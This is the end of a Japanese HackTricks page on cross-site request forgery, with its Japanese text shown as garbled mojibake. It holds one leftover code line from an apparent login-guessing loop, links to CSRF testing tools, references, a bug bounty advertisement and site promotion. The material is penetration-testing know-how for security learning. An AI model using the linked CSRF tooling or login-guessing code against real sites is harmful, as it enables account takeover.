login(USER, line.strip())
```
## ãƒ„ãƒ¼ãƒ« <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofã¯ã™ã¹ã¦ã®æš—å·ãƒã‚°å ±å¥¨é‡‘ã®å ´ã§ã™ã€‚**

**é…å»¶ãªã—ã§å ±é…¬ã‚’å—ã‘å–ã‚‹**\
HackenProofã®å ±å¥¨é‡‘ã¯ã€é¡§å®¢ãŒå ±å¥¨é‡‘äºˆç®—ã‚’å…¥é‡‘ã—ãŸå¾Œã«é–‹å§‹ã•ã‚Œã¾ã™ã€‚ãƒã‚°ãŒæ¤œè¨¼ã•ã‚ŒãŸå¾Œã«å ±é…¬ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Web3ãƒšãƒ³ãƒ†ã‚¹ãƒˆã®çµŒé¨“ã‚’ç©ã‚€**\
ãƒ–ãƒ­ãƒƒã‚¯ãƒã‚§ãƒ¼ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒˆãƒ©ã‚¯ãƒˆã¯æ–°ã—ã„ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã™ï¼ãã®æˆé•·æœŸã«ãŠã‘ã‚‹web3ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚

**Web3ãƒãƒƒã‚«ãƒ¼ãƒ¬ã‚¸ã‚§ãƒ³ãƒ‰ã«ãªã‚‹**\
å„æ¤œè¨¼æ¸ˆã¿ã®ãƒã‚°ã”ã¨ã«è©•åˆ¤ãƒã‚¤ãƒ³ãƒˆã‚’ç²å¾—ã—ã€é€±é–“ãƒªãƒ¼ãƒ€ãƒ¼ãƒœãƒ¼ãƒ‰ã®ãƒˆãƒƒãƒ—ã‚’åˆ¶è¦‡ã—ã¾ã—ã‚‡ã†ã€‚

[**HackenProofã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**](https://hackenproof.com/register)ã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ã‹ã‚‰å ±é…¬ã‚’å¾—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ã¦ã¿ã¾ã›ã‚“ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã‚Šã€**PDFã§HackTricksã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã‚Šã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>
